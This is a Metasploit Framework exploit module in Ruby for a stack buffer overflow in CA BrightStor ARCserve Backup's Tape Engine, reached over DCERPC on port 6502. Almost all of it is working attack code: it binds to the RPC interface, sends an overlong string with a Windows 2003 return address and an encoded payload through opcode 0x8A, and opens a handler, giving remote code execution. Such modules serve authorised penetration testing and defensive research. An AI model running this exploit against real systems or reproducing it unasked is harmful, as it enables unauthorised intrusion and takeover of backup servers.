# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote

  Rank = AverageRanking

  include Msf::Exploit::Remote::DCERPC

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;CA BrightStor ARCserve Tape Engine 0x8A Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup
        r11.1 - r11.5. By sending a specially crafted DCERPC request, an attacker could overflow
        the buffer and execute arbitrary code.
      },
      &#039;Author&#039;         => [ &#039;MC&#039; ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;68330&#039;],
          [ &#039;URL&#039;, &#039;http://www.metasploit.com/users/mc&#039; ],
        ],
      &#039;Privileged&#039;     => true,
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 500,
          &#039;BadChars&#039; => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
          &#039;StackAdjustment&#039; => -3500,
        },
      &#039;Platform&#039; => &#039;win&#039;,
      &#039;Targets&#039;  =>
        [
          [ &#039;BrightStor ARCserve r11.5/Windows 2003&#039;,     { &#039;Ret&#039; => 0x28eb6493 } ],
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 4 2010&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options([ Opt::RPORT(6502) ], self.class)
  end

  def exploit

    connect

    handle = dcerpc_handle(&#039;62b93df0-8b02-11ce-876c-00805f842837&#039;, &#039;1.0&#039;, &#039;ncacn_ip_tcp&#039;, [datastore[&#039;RPORT&#039;]])
    print_status("Binding to #{handle} ...")

    dcerpc_bind(handle)
    print_status("Bound to #{handle} ...")

    request =  "\x00\x04\x08\x0c\x05\x00\x00\x00\x00\x00"
    request << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

    dcerpc.call(0x2B, request)

    sploit =  NDR.long(4)
    sploit << NDR.string(rand_text_alpha_upper(1002) + [target.ret].pack(&#039;V&#039;) + payload.encoded + "\x00")

    print_status("Trying target #{target.name}...")

      begin
        dcerpc_call(0x8A, sploit)
        rescue Rex::Proto::DCERPC::Exceptions::NoResponse
      end

    handler
    disconnect

  end

end
=begin
/* opcode: 0x8A, address: 0x100707D0 */

long   sub_100707D0 (
 [in] handle_t  arg_1,
 [in] long  arg_2,
 [in][ref][string] char * arg_3
);
=end

